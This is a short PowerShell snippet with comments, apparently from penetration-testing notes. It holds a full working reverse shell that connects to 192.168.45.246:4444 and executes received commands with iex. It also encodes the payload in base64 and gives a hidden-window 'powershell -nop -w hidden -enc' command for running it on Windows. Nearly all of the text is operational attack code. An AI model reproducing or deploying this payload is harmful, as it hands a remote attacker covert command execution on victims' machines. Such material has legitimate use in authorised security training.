$TEXTO = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.246",4444);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$ENCODED1 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXTO))
Write-Output $ENCODED1

#The above script can be executed in a Kali machine with pwsh utility. It is recommend since the current base64 linux built-in tool doesn't is compatible with default powershell decoder and wil not work in other way.

#In a Windows hosts, this can be used in the following command: powershell -nop -w hidden -enc <encryptedrevshell>
